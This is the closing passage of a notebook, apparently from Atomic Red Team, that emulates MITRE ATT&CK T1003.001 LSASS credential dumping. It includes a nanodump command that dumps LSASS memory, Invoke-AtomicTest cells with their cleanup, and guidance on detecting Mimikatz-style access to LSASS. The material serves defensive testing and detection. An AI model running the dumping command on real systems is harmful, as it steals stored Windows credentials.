  },
  {
   "cell_type": "markdown",
   "id": "8d33fcb9",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nPathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe --silent-process-exit \"%temp%\\SilentProcessExit\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "73fe9704",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 14"
  },
  {
   "cell_type": "markdown",
   "id": "8d302db4",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nrmdir \"%temp%\\SilentProcessExit\" /s /q >nul 2> nul\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "de842e91",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 14 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "53ace3db",
   "metadata": {},
   "source": "## Detection\nMonitor for unexpected processes interacting with LSASS.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.\n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}